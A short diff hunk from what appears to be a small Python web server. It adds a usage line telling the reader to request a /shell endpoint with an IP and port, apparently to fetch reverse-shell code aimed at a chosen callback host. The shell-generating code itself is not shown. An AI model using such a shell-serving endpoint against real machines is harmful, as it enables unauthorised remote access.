@@ -16,4 +16,4 @@ def send_code():
 
 app.run(host=IP,port=PORT)
 
-
+http req should be made to http://IP:PORT/shell?ip=[ip_addr]&port=[port_addr]
